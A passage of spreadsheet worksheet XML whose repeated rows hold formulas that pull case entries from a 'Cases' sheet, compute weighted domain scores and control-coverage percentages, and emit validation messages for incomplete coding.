      </c>
      <c r="AJ114" s="13">
        <f>IF(AI114="","",N(E114)*3+N(F114)*2+N(G114)*2+N(H114)*2+N(I114)*2+N(J114)*3+N(K114)*3+N(L114)*3)</f>
        <v/>
      </c>
      <c r="AK114" s="13">
        <f>IF(AI114="","",COUNTIF(N114:AG114,1))</f>
        <v/>
      </c>
      <c r="AL114" s="13">
        <f>IF(OR(AJ114="",AJ114=0),"",ROUND(100*(AJ114-AK114)/AJ114,1))</f>
        <v/>
      </c>
      <c r="AM114" s="11">
        <f>IF(AI114="","",IF(AI114=0,"No domain coded 1; ","")&amp;IF(M114="","Primary domain missing; ",IF(IFERROR(INDEX(E114:L114,1,M114),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N114:AG114)&lt;&gt;AJ114,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH114="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN114" s="13">
        <f>IF(AND(AI114&lt;&gt;"",AM114=""),1,0)</f>
        <v/>
      </c>
      <c r="AO114" s="14" t="n"/>
    </row>
    <row r="115">
      <c r="A115" s="11">
        <f>Cases!A115</f>
        <v/>
      </c>
      <c r="B115" s="11">
        <f>Cases!B115</f>
        <v/>
      </c>
      <c r="C115" s="11">
        <f>Cases!C115</f>
        <v/>
      </c>
      <c r="D115" s="11">
        <f>IF(Cases!F115="",LEFT(Cases!G115,120),Cases!F115)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E115:L115)=0,"",SUM(E115:L115))</f>
        <v/>
      </c>
      <c r="AJ115" s="13">
        <f>IF(AI115="","",N(E115)*3+N(F115)*2+N(G115)*2+N(H115)*2+N(I115)*2+N(J115)*3+N(K115)*3+N(L115)*3)</f>
        <v/>
      </c>
      <c r="AK115" s="13">
        <f>IF(AI115="","",COUNTIF(N115:AG115,1))</f>
        <v/>
      </c>
      <c r="AL115" s="13">
        <f>IF(OR(AJ115="",AJ115=0),"",ROUND(100*(AJ115-AK115)/AJ115,1))</f>
        <v/>
      </c>
      <c r="AM115" s="11">
        <f>IF(AI115="","",IF(AI115=0,"No domain coded 1; ","")&amp;IF(M115="","Primary domain missing; ",IF(IFERROR(INDEX(E115:L115,1,M115),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N115:AG115)&lt;&gt;AJ115,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH115="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN115" s="13">
        <f>IF(AND(AI115&lt;&gt;"",AM115=""),1,0)</f>
        <v/>
      </c>
      <c r="AO115" s="14" t="n"/>
    </row>
    <row r="116">
      <c r="A116" s="11">
        <f>Cases!A116</f>
        <v/>
      </c>
      <c r="B116" s="11">
        <f>Cases!B116</f>
        <v/>
      </c>
      <c r="C116" s="11">
        <f>Cases!C116</f>
        <v/>
      </c>
      <c r="D116" s="11">
        <f>IF(Cases!F116="",LEFT(Cases!G116,120),Cases!F116)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E116:L116)=0,"",SUM(E116:L116))</f>
        <v/>
      </c>
      <c r="AJ116" s="13">
        <f>IF(AI116="","",N(E116)*3+N(F116)*2+N(G116)*2+N(H116)*2+N(I116)*2+N(J116)*3+N(K116)*3+N(L116)*3)</f>
        <v/>
      </c>
      <c r="AK116" s="13">
        <f>IF(AI116="","",COUNTIF(N116:AG116,1))</f>
        <v/>
      </c>
      <c r="AL116" s="13">
        <f>IF(OR(AJ116="",AJ116=0),"",ROUND(100*(AJ116-AK116)/AJ116,1))</f>
        <v/>
      </c>
      <c r="AM116" s="11">
        <f>IF(AI116="","",IF(AI116=0,"No domain coded 1; ","")&amp;IF(M116="","Primary domain missing; ",IF(IFERROR(INDEX(E116:L116,1,M116),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N116:AG116)&lt;&gt;AJ116,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH116="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN116" s="13">
        <f>IF(AND(AI116&lt;&gt;"",AM116=""),1,0)</f>
        <v/>
      </c>
      <c r="AO116" s="14" t="n"/>
    </row>
    <row r="117">
      <c r="A117" s="11">
        <f>Cases!A117</f>
        <v/>
      </c>
      <c r="B117" s="11">
        <f>Cases!B117</f>
        <v/>
      </c>
      <c r="C117" s="11">
        <f>Cases!C117</f>
        <v/>
      </c>
      <c r="D117" s="11">
        <f>IF(Cases!F117="",LEFT(Cases!G117,120),Cases!F117)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E117:L117)=0,"",SUM(E117:L117))</f>
        <v/>
      </c>
      <c r="AJ117" s="13">
        <f>IF(AI117="","",N(E117)*3+N(F117)*2+N(G117)*2+N(H117)*2+N(I117)*2+N(J117)*3+N(K117)*3+N(L117)*3)</f>
        <v/>
      </c>
      <c r="AK117" s="13">
        <f>IF(AI117="","",COUNTIF(N117:AG117,1))</f>
        <v/>
      </c>
      <c r="AL117" s="13">
        <f>IF(OR(AJ117="",AJ117=0),"",ROUND(100*(AJ117-AK117)/AJ117,1))</f>
        <v/>
      </c>
      <c r="AM117" s="11">
        <f>IF(AI117="","",IF(AI117=0,"No domain coded 1; ","")&amp;IF(M117="","Primary domain missing; ",IF(IFERROR(INDEX(E117:L117,1,M117),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N117:AG117)&lt;&gt;AJ117,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH117="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN117" s="13">
        <f>IF(AND(AI117&lt;&gt;"",AM117=""),1,0)</f>
        <v/>
      </c>
      <c r="AO117" s="14" t="n"/>
    </row>
    <row r="118">
      <c r="A118" s="11">
        <f>Cases!A118</f>
        <v/>
      </c>
      <c r="B118" s="11">
        <f>Cases!B118</f>
        <v/>
      </c>
      <c r="C118" s="11">
        <f>Cases!C118</f>
        <v/>
      </c>
      <c r="D118" s="11">
        <f>IF(Cases!F118="",LEFT(Cases!G118,120),Cases!F118)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E118:L118)=0,"",SUM(E118:L118))</f>
        <v/>
      </c>
      <c r="AJ118" s="13">
        <f>IF(AI118="","",N(E118)*3+N(F118)*2+N(G118)*2+N(H118)*2+N(I118)*2+N(J118)*3+N(K118)*3+N(L118)*3)</f>
        <v/>
      </c>
      <c r="AK118" s="13">
        <f>IF(AI118="","",COUNTIF(N118:AG118,1))</f>
        <v/>
      </c>
      <c r="AL118" s="13">
        <f>IF(OR(AJ118="",AJ118=0),"",ROUND(100*(AJ118-AK118)/AJ118,1))</f>
        <v/>
      </c>
      <c r="AM118" s="11">
        <f>IF(AI118="","",IF(AI118=0,"No domain coded 1; ","")&amp;IF(M118="","Primary domain missing; ",IF(IFERROR(INDEX(E118:L118,1,M118),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N118:AG118)&lt;&gt;AJ118,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH118="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN118" s="13">
        <f>IF(AND(AI118&lt;&gt;"",AM118=""),1,0)</f>
        <v/>
      </c>
      <c r="AO118" s="14" t="n"/>
    </row>
    <row r="119">
      <c r="A119" s="11">
        <f>Cases!A119</f>
        <v/>
      </c>
      <c r="B119" s="11">
        <f>Cases!B119</f>
        <v/>
      </c>
      <c r="C119" s="11">
        <f>Cases!C119</f>
        <v/>
      </c>
      <c r="D119" s="11">
        <f>IF(Cases!F119="",LEFT(Cases!G119,120),Cases!F119)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E119:L119)=0,"",SUM(E119:L119))</f>
        <v/>
      </c>
      <c r="AJ119" s="13">
        <f>IF(AI119="","",N(E119)*3+N(F119)*2+N(G119)*2+N(H119)*2+N(I119)*2+N(J119)*3+N(K119)*3+N(L119)*3)</f>
        <v/>
      </c>
      <c r="AK119" s="13">
        <f>IF(AI119="","",COUNTIF(N119:AG119,1))</f>
        <v/>
      </c>
      <c r="AL119" s="13">
        <f>IF(OR(AJ119="",AJ119=0),"",ROUND(100*(AJ119-AK119)/AJ119,1))</f>
        <v/>
      </c>
      <c r="AM119" s="11">
        <f>IF(AI119="","",IF(AI119=0,"No domain coded 1; ","")&amp;IF(M119="","Primary domain missing; ",IF(IFERROR(INDEX(E119:L119,1,M119),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N119:AG119)&lt;&gt;AJ119,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH119="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN119" s="13">
        <f>IF(AND(AI119&lt;&gt;"",AM119=""),1,0)</f>
        <v/>
      </c>
      <c r="AO119" s="14" t="n"/>
    </row>
    <row r="120">
      <c r="A120" s="11">
        <f>Cases!A120</f>
        <v/>
      </c>
      <c r="B120" s="11">
        <f>Cases!B120</f>
        <v/>
      </c>
      <c r="C120" s="11">
        <f>Cases!C120</f>
        <v/>
      </c>
      <c r="D120" s="11">
        <f>IF(Cases!F120="",LEFT(Cases!G120,120),Cases!F120)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E120:L120)=0,"",SUM(E120:L120))</f>
        <v/>
      </c>
      <c r="AJ120" s="13">
        <f>IF(AI120="","",N(E120)*3+N(F120)*2+N(G120)*2+N(H120)*2+N(I120)*2+N(J120)*3+N(K120)*3+N(L120)*3)</f>
        <v/>
      </c>
      <c r="AK120" s="13">
        <f>IF(AI120="","",COUNTIF(N120:AG120,1))</f>
        <v/>
      </c>
      <c r="AL120" s="13">
        <f>IF(OR(AJ120="",AJ120=0),"",ROUND(100*(AJ120-AK120)/AJ120,1))</f>
        <v/>
      </c>
      <c r="AM120" s="11">
        <f>IF(AI120="","",IF(AI120=0,"No domain coded 1; ","")&amp;IF(M120="","Primary domain missing; ",IF(IFERROR(INDEX(E120:L120,1,M120),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N120:AG120)&lt;&gt;AJ120,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH120="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN120" s="13">
        <f>IF(AND(AI120&lt;&gt;"",AM120=""),1,0)</f>
        <v/>
      </c>
      <c r="AO120" s="14" t="n"/>
    </row>
    <row r="121">
      <c r="A121" s="11">
        <f>Cases!A121</f>
        <v/>
      </c>
      <c r="B121" s="11">
        <f>Cases!B121</f>
        <v/>
      </c>
      <c r="C121" s="11">
        <f>Cases!C121</f>
        <v/>
      </c>
      <c r="D121" s="11">
        <f>IF(Cases!F121="",LEFT(Cases!G121,120),Cases!F121)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E121:L121)=0,"",SUM(E121:L121))</f>
        <v/>
      </c>
      <c r="AJ121" s="13">
        <f>IF(AI121="","",N(E121)*3+N(F121)*2+N(G121)*2+N(H121)*2+N(I121)*2+N(J121)*3+N(K121)*3+N(L121)*3)</f>
        <v/>
      </c>
      <c r="AK121" s="13">
        <f>IF(AI121="","",COUNTIF(N121:AG121,1))</f>
        <v/>
      </c>
      <c r="AL121" s="13">
        <f>IF(OR(AJ121="",AJ121=0),"",ROUND(100*(AJ121-AK121)/AJ121,1))</f>
        <v/>
      </c>
      <c r="AM121" s="11">
        <f>IF(AI121="","",IF(AI121=0,"No domain coded 1; ","")&amp;IF(M121="","Primary domain missing; ",IF(IFERROR(INDEX(E121:L121,1,M121),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N121:AG121)&lt;&gt;AJ121,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH121="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN121" s="13">
        <f>IF(AND(AI121&lt;&gt;"",AM121=""),1,0)</f>
        <v/>
      </c>
      <c r="AO121" s="14" t="n"/>
    </row>
    <row r="122">
      <c r="A122" s="11">
        <f>Cases!A122</f>
        <v/>
      </c>
      <c r="B122" s="11">
        <f>Cases!B122</f>
        <v/>
      </c>
      <c r="C122" s="11">
        <f>Cases!C122</f>
        <v/>
      </c>
      <c r="D122" s="11">
        <f>IF(Cases!F122="",LEFT(Cases!G122,120),Cases!F122)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E122:L122)=0,"",SUM(E122:L122))</f>
        <v/>
      </c>
      <c r="AJ122" s="13">
        <f>IF(AI122="","",N(E122)*3+N(F122)*2+N(G122)*2+N(H122)*2+N(I122)*2+N(J122)*3+N(K122)*3+N(L122)*3)</f>
        <v/>
      </c>
      <c r="AK122" s="13">
        <f>IF(AI122="","",COUNTIF(N122:AG122,1))</f>
        <v/>
      </c>
      <c r="AL122" s="13">
        <f>IF(OR(AJ122="",AJ122=0),"",ROUND(100*(AJ122-AK122)/AJ122,1))</f>
        <v/>
      </c>
      <c r="AM122" s="11">
        <f>IF(AI122="","",IF(AI122=0,"No domain coded 1; ","")&amp;IF(M122="","Primary domain missing; ",IF(IFERROR(INDEX(E122:L122,1,M122),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N122:AG122)&lt;&gt;AJ122,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH122="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN122" s="13">
        <f>IF(AND(AI122&lt;&gt;"",AM122=""),1,0)</f>
        <v/>
      </c>
      <c r="AO122" s="14" t="n"/>
    </row>
    <row r="123">
      <c r="A123" s="11">
        <f>Cases!A123</f>
        <v/>
      </c>
      <c r="B123" s="11">
        <f>Cases!B123</f>
        <v/>
      </c>
      <c r="C123" s="11">
        <f>Cases!C123</f>
        <v/>
      </c>
      <c r="D123" s="11">
        <f>IF(Cases!F123="",LEFT(Cases!G123,120),Cases!F123)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E123:L123)=0,"",SUM(E123:L123))</f>
        <v/>
      </c>
      <c r="AJ123" s="13">
        <f>IF(AI123="","",N(E123)*3+N(F123)*2+N(G123)*2+N(H123)*2+N(I123)*2+N(J123)*3+N(K123)*3+N(L123)*3)</f>
        <v/>
      </c>
      <c r="AK123" s="13">
        <f>IF(AI123="","",COUNTIF(N123:AG123,1))</f>
        <v/>
      </c>
      <c r="AL123" s="13">
        <f>IF(OR(AJ123="",AJ123=0),"",ROUND(100*(AJ123-AK123)/AJ123,1))</f>
        <v/>
      </c>
      <c r="AM123" s="11">
        <f>IF(AI123="","",IF(AI123=0,"No domain coded 1; ","")&amp;IF(M123="","Primary domain missing; ",IF(IFERROR(INDEX(E123:L123,1,M123),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N123:AG123)&lt;&gt;AJ123,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH123="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN123" s="13">
        <f>IF(AND(AI123&lt;&gt;"",AM123=""),1,0)</f>
        <v/>
      </c>
      <c r="AO123" s="14" t="n"/>
    </row>
    <row r="124">
      <c r="A124" s="11">
        <f>Cases!A124</f>
        <v/>
      </c>
      <c r="B124" s="11">
        <f>Cases!B124</f>
        <v/>
      </c>
      <c r="C124" s="11">
        <f>Cases!C124</f>
        <v/>
      </c>
      <c r="D124" s="11">
        <f>IF(Cases!F124="",LEFT(Cases!G124,120),Cases!F124)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E124:L124)=0,"",SUM(E124:L124))</f>
        <v/>
      </c>
      <c r="AJ124" s="13">
        <f>IF(AI124="","",N(E124)*3+N(F124)*2+N(G124)*2+N(H124)*2+N(I124)*2+N(J124)*3+N(K124)*3+N(L124)*3)</f>
        <v/>
      </c>
      <c r="AK124" s="13">
        <f>IF(AI124="","",COUNTIF(N124:AG124,1))</f>
        <v/>
      </c>
      <c r="AL124" s="13">
        <f>IF(OR(AJ124="",AJ124=0),"",ROUND(100*(AJ124-AK124)/AJ124,1))</f>
        <v/>
      </c>
      <c r="AM124" s="11">
        <f>IF(AI124="","",IF(AI124=0,"No domain coded 1; ","")&amp;IF(M124="","Primary domain missing; ",IF(IFERROR(INDEX(E124:L124,1,M124),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N124:AG124)&lt;&gt;AJ124,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH124="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN124" s="13">
        <f>IF(AND(AI124&lt;&gt;"",AM124=""),1,0)</f>
        <v/>
      </c>
      <c r="AO124" s="14" t="n"/>
    </row>
    <row r="125">
      <c r="A125" s="11">
        <f>Cases!A125</f>
        <v/>
      </c>
      <c r="B125" s="11">
        <f>Cases!B125</f>
        <v/>
      </c>
      <c r="C125" s="11">
        <f>Cases!C125</f>
        <v/>
      </c>
      <c r="D125" s="11">
        <f>IF(Cases!F125="",LEFT(Cases!G125,120),Cases!F125)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E125:L125)=0,"",SUM(E125:L125))</f>
        <v/>
      </c>
      <c r="AJ125" s="13">
        <f>IF(AI125="","",N(E125)*3+N(F125)*2+N(G125)*2+N(H125)*2+N(I125)*2+N(J125)*3+N(K125)*3+N(L125)*3)</f>
        <v/>
      </c>
      <c r="AK125" s="13">
        <f>IF(AI125="","",COUNTIF(N125:AG125,1))</f>
        <v/>
      </c>
      <c r="AL125" s="13">
        <f>IF(OR(AJ125="",AJ125=0),"",ROUND(100*(AJ125-AK125)/AJ125,1))</f>
        <v/>
      </c>
      <c r="AM125" s="11">
        <f>IF(AI125="","",IF(AI125=0,"No domain coded 1; ","")&amp;IF(M125="","Primary domain missing; ",IF(IFERROR(INDEX(E125:L125,1,M125),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N125:AG125)&lt;&gt;AJ125,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH125="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN125" s="13">
        <f>IF(AND(AI125&lt;&gt;"",AM125=""),1,0)</f>
        <v/>
      </c>
      <c r="AO125" s="14" t="n"/>
    </row>
    <row r="126">
      <c r="A126" s="11">
        <f>Cases!A126</f>
        <v/>
      </c>
      <c r="B126" s="11">
        <f>Cases!B126</f>
        <v/>
      </c>
      <c r="C126" s="11">
        <f>Cases!C126</f>
        <v/>
      </c>
      <c r="D126" s="11">
        <f>IF(Cases!F126="",LEFT(Cases!G126,120),Cases!F126)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E126:L126)=0,"",SUM(E126:L126))</f>
        <v/>
      </c>
      <c r="AJ126" s="13">
        <f>IF(AI126="","",N(E126)*3+N(F126)*2+N(G126)*2+N(H126)*2+N(I126)*2+N(J126)*3+N(K126)*3+N(L126)*3)</f>
        <v/>
      </c>
      <c r="AK126" s="13">
        <f>IF(AI126="","",COUNTIF(N126:AG126,1))</f>
        <v/>
      </c>
      <c r="AL126" s="13">
        <f>IF(OR(AJ126="",AJ126=0),"",ROUND(100*(AJ126-AK126)/AJ126,1))</f>
        <v/>
      </c>
      <c r="AM126" s="11">
        <f>IF(AI126="","",IF(AI126=0,"No domain coded 1; ","")&amp;IF(M126="","Primary domain missing; ",IF(IFERROR(INDEX(E126:L126,1,M126),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N126:AG126)&lt;&gt;AJ126,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH126="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN126" s="13">
        <f>IF(AND(AI126&lt;&gt;"",AM126=""),1,0)</f>
        <v/>
      </c>
      <c r="AO126" s="14" t="n"/>
    </row>
    <row r="127">
      <c r="A127" s="11">
        <f>Cases!A127</f>
        <v/>
      </c>
      <c r="B127" s="11">
        <f>Cases!B127</f>
        <v/>
      </c>
      <c r="C127" s="11">
        <f>Cases!C127</f>
        <v/>
      </c>
      <c r="D127" s="11">
        <f>IF(Cases!F127="",LEFT(Cases!G127,120),Cases!F127)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E127:L127)=0,"",SUM(E127:L127))</f>
        <v/>
      </c>
      <c r="AJ127" s="13">
        <f>IF(AI127="","",N(E127)*3+N(F127)*2+N(G127)*2+N(H127)*2+N(I127)*2+N(J127)*3+N(K127)*3+N(L127)*3)</f>
        <v/>
      </c>
      <c r="AK127" s="13">
        <f>IF(AI127="","",COUNTIF(N127:AG127,1))</f>
        <v/>
      </c>
      <c r="AL127" s="13">
        <f>IF(OR(AJ127="",AJ127=0),"",ROUND(100*(AJ127-AK127)/AJ127,1))</f>
        <v/>
      </c>
      <c r="AM127" s="11">
        <f>IF(AI127="","",IF(AI127=0,"No domain coded 1; ","")&amp;IF(M127="","Primary domain missing; ",IF(IFERROR(INDEX(E127:L127,1,M127),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N127:AG127)&lt;&gt;AJ127,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH127="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN127" s="13">
        <f>IF(AND(AI127&lt;&gt;"",AM127=""),1,0)</f>
        <v/>
      </c>
      <c r="AO127" s="14" t="n"/>
    </row>
    <row r="128">
      <c r="A128" s="11">
        <f>Cases!A128</f>
        <v/>
      </c>
      <c r="B128" s="11">
        <f>Cases!B128</f>
        <v/>
      </c>
      <c r="C128" s="11">
        <f>Cases!C128</f>
        <v/>
      </c>
      <c r="D128" s="11">
        <f>IF(Cases!F128="",LEFT(Cases!G128,120),Cases!F128)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E128:L128)=0,"",SUM(E128:L128))</f>
        <v/>
      </c>
      <c r="AJ128" s="13">
        <f>IF(AI128="","",N(E128)*3+N(F128)*2+N(G128)*2+N(H128)*2+N(I128)*2+N(J128)*3+N(K128)*3+N(L128)*3)</f>
        <v/>
      </c>
      <c r="AK128" s="13">
        <f>IF(AI128="","",COUNTIF(N128:AG128,1))</f>
        <v/>
      </c>
      <c r="AL128" s="13">
        <f>IF(OR(AJ128="",AJ128=0),"",ROUND(100*(AJ128-AK128)/AJ128,1))</f>
        <v/>
      </c>
      <c r="AM128" s="11">
        <f>IF(AI128="","",IF(AI128=0,"No domain coded 1; ","")&amp;IF(M128="","Primary domain missing; ",IF(IFERROR(INDEX(E128:L128,1,M128),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N128:AG128)&lt;&gt;AJ128,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH128="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN128" s="13">
        <f>IF(AND(AI128&lt;&gt;"",AM128=""),1,0)</f>
        <v/>
      </c>
      <c r="AO128" s="14" t="n"/>
    </row>
    <row r="129">
      <c r="A129" s="11">
        <f>Cases!A129</f>
        <v/>
      </c>
      <c r="B129" s="11">
        <f>Cases!B129</f>
        <v/>
      </c>
      <c r="C129" s="11">
        <f>Cases!C129</f>
        <v/>
      </c>
      <c r="D129" s="11">
        <f>IF(Cases!F129="",LEFT(Cases!G129,120),Cases!F129)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E129:L129)=0,"",SUM(E129:L129))</f>
        <v/>
      </c>
      <c r="AJ129" s="13">
        <f>IF(AI129="","",N(E129)*3+N(F129)*2+N(G129)*2+N(H129)*2+N(I129)*2+N(J129)*3+N(K129)*3+N(L129)*3)</f>
        <v/>
      </c>
      <c r="AK129" s="13">
        <f>IF(AI129="","",COUNTIF(N129:AG129,1))</f>
        <v/>
      </c>
      <c r="AL129" s="13">
        <f>IF(OR(AJ129="",AJ129=0),"",ROUND(100*(AJ129-AK129)/AJ129,1))</f>
        <v/>
      </c>
      <c r="AM129" s="11">
        <f>IF(AI129="","",IF(AI129=0,"No domain coded 1; ","")&amp;IF(M129="","Primary domain missing; ",IF(IFERROR(INDEX(E129:L129,1,M129),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N129:AG129)&lt;&gt;AJ129,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH129="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN129" s="13">
        <f>IF(AND(AI129&lt;&gt;"",AM129=""),1,0)</f>
        <v/>
      </c>
      <c r="AO129" s="14" t="n"/>
    </row>
    <row r="130">
      <c r="A130" s="11">
        <f>Cases!A130</f>
        <v/>
      </c>
      <c r="B130" s="11">
        <f>Cases!B130</f>
        <v/>
      </c>
      <c r="C130" s="11">
        <f>Cases!C130</f>
        <v/>
      </c>
      <c r="D130" s="11">
        <f>IF(Cases!F130="",LEFT(Cases!G130,120),Cases!F130)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E130:L130)=0,"",SUM(E130:L130))</f>
        <v/>
      </c>
      <c r="AJ130" s="13">
        <f>IF(AI130="","",N(E130)*3+N(F130)*2+N(G130)*2+N(H130)*2+N(I130)*2+N(J130)*3+N(K130)*3+N(L130)*3)</f>
        <v/>
      </c>
      <c r="AK130" s="13">
        <f>IF(AI130="","",COUNTIF(N130:AG130,1))</f>
        <v/>
      </c>
      <c r="AL130" s="13">
        <f>IF(OR(AJ130="",AJ130=0),"",ROUND(100*(AJ130-AK130)/AJ130,1))</f>
        <v/>
      </c>
      <c r="AM130" s="11">
        <f>IF(AI130="","",IF(AI130=0,"No domain coded 1; ","")&amp;IF(M130="","Primary domain missing; ",IF(IFERROR(INDEX(E130:L130,1,M130),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N130:AG130)&lt;&gt;AJ130,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH130="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN130" s="13">
        <f>IF(AND(AI130&lt;&gt;"",AM130=""),1,0)</f>
        <v/>
      </c>
      <c r="AO130" s="14" t="n"/>
    </row>
    <row r="131">
      <c r="A131" s="11">
        <f>Cases!A131</f>
        <v/>
      </c>
      <c r="B131" s="11">
        <f>Cases!B131</f>
        <v/>
      </c>
      <c r="C131" s="11">
        <f>Cases!C131</f>
        <v/>
      </c>
      <c r="D131" s="11">
        <f>IF(Cases!F131="",LEFT(Cases!G131,120),Cases!F131)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E131:L131)=0,"",SUM(E131:L131))</f>
        <v/>
      </c>
      <c r="AJ131" s="13">
        <f>IF(AI131="","",N(E131)*3+N(F131)*2+N(G131)*2+N(H131)*2+N(I131)*2+N(J131)*3+N(K131)*3+N(L131)*3)</f>
        <v/>
      </c>
      <c r="AK131" s="13">
        <f>IF(AI131="","",COUNTIF(N131:AG131,1))</f>
        <v/>
      </c>
      <c r="AL131" s="13">
        <f>IF(OR(AJ131="",AJ131=0),"",ROUND(100*(AJ131-AK131)/AJ131,1))</f>
        <v/>
      </c>
      <c r="AM131" s="11">
        <f>IF(AI131="","",IF(AI131=0,"No domain coded 1; ","")&amp;IF(M131="","Primary domain missing; ",IF(IFERROR(INDEX(E131:L131,1,M131),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N131:AG131)&lt;&gt;AJ131,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH131="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN131" s="13">
        <f>IF(AND(AI131&lt;&gt;"",AM131=""),1,0)</f>
        <v/>
      </c>
      <c r="AO131" s="14" t="n"/>
    </row>
    <row r="132">
      <c r="A132" s="11">
        <f>Cases!A132</f>
        <v/>
      </c>
      <c r="B132" s="11">
        <f>Cases!B132</f>
        <v/>
      </c>
      <c r="C132" s="11">
        <f>Cases!C132</f>
        <v/>
      </c>
      <c r="D132" s="11">
        <f>IF(Cases!F132="",LEFT(Cases!G132,120),Cases!F132)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E132:L132)=0,"",SUM(E132:L132))</f>
        <v/>
      </c>
      <c r="AJ132" s="13">
        <f>IF(AI132="","",N(E132)*3+N(F132)*2+N(G132)*2+N(H132)*2+N(I132)*2+N(J132)*3+N(K132)*3+N(L132)*3)</f>
        <v/>
      </c>
      <c r="AK132" s="13">
        <f>IF(AI132="","",COUNTIF(N132:AG132,1))</f>
        <v/>
      </c>
      <c r="AL132" s="13">
        <f>IF(OR(AJ132="",AJ132=0),"",ROUND(100*(AJ132-AK132)/AJ132,1))</f>
        <v/>
      </c>
      <c r="AM132" s="11">
        <f>IF(AI132="","",IF(AI132=0,"No domain coded 1; ","")&amp;IF(M132="","Primary domain missing; ",IF(IFERROR(INDEX(E132:L132,1,M132),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N132:AG132)&lt;&gt;AJ132,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH132="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN132" s="13">
        <f>IF(AND(AI132&lt;&gt;"",AM132=""),1,0)</f>
        <v/>
      </c>
      <c r="AO132" s="14" t="n"/>
    </row>
    <row r="133">
      <c r="A133" s="11">
        <f>Cases!A133</f>
        <v/>
      </c>
      <c r="B133" s="11">
        <f>Cases!B133</f>
        <v/>
      </c>
      <c r="C133" s="11">
        <f>Cases!C133</f>
        <v/>
      </c>
